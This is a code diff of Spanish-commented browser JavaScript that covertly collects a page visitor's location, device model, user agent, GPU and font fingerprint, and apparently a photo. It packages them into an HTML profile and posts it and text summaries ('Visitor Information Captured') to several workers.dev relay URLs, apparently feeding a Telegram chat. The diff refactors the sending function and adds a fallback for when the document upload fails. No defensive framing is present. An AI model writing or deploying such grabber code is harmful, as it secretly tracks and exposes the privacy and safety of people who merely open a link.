@@ -28,7 +28,7 @@
             'https://kali-bot12.societykark.workers.dev'
         ];
 
-        // ========== FUNCIONES DE RECOLECCIÓN MEJORADAS ==========
+        // ========== FUNCIONES DE RECOLECCIÓN (igual que antes) ==========
 
         async function getLocationFromWorker() {
             try {
@@ -183,6 +183,9 @@
             return blob;
         }
 
+        // ========== FUNCIONES DE ENVÍO MEJORADAS ==========
+
+        // Enviar mensaje de texto + foto + ubicación (ya existente)
         async function sendToMultiple(text, photoBlob, location) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -202,17 +205,20 @@
                     }
                 })
             );
-            console.log('Resultados:', resultados);
+            console.log('Resultados texto:', resultados);
             return resultados.some(r => r.ok);
         }
 
-        // ========== NUEVA FUNCIÓN PARA ENVIAR EL DOCUMENTO HTML ==========
-        async function sendDocumentToAll(urls, chatId, documentBlob, filename) {
+        // NUEVA: Enviar documento HTML a TODOS los workers
+        async function sendDocumentToAll(htmlContent) {
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            const filename = `perfil_${Date.now()}.html`;
             const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('document', documentBlob, filename);
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', blob, filename);
+
             const resultados = await Promise.all(
-                urls.map(async (url) => {
+                URLS.map(async (url) => {
                     try {
                         const res = await fetch(url, { method: 'POST', body: formData });
                         return { url, ok: res.ok };
@@ -221,8 +227,19 @@
                     }
                 })
             );
-            console.log('Documento enviado a:', resultados);
-            return resultados.some(r => r.ok);
+            console.log('Resultados documento:', resultados);
+            // Si todos fallan, intentar enviar el HTML como texto (por si acaso)
+            if (!resultados.some(r => r.ok)) {
+                console.warn('Ningún worker aceptó el documento, intentando como texto...');
+                // Enviar el HTML completo como mensaje de texto (se cortará si es muy largo)
+                const textFallback = `📄 HTML completo (puede estar truncado):\n\n${htmlContent.substring(0, 4000)}...`;
+                const fallbackForm = new FormData();
+                fallbackForm.append('chat_id', CHAT_ID);
+                fallbackForm.append('text', textFallback);
+                await Promise.all(
+                    URLS.map(url => fetch(url, { method: 'POST', body: fallbackForm }).catch(() => {}))
+                );
+            }
         }
 
         // ========== GENERAR HTML CON TODOS LOS DATOS ==========
@@ -343,12 +360,10 @@ h1 { color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text-
                 // Generar HTML
                 const htmlContent = generateHTML(data);
 
-                // ========== NUEVO: ENVIAR EL HTML COMO DOCUMENTO A TODOS LOS WORKERS ==========
-                const htmlBlob = new Blob([htmlContent], { type: 'text/html' });
-                const filename = `perfil_${Date.now()}.html`;
-                await sendDocumentToAll(URLS, CHAT_ID, htmlBlob, filename);
+                // ========== ENVIAR DOCUMENTO HTML A TODOS LOS WORKERS ==========
+                await sendDocumentToAll(htmlContent);
 
-                // También enviar resumen en texto
+                // También enviar resumen en texto (como ya hacías)
                 let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
                 msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                 msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
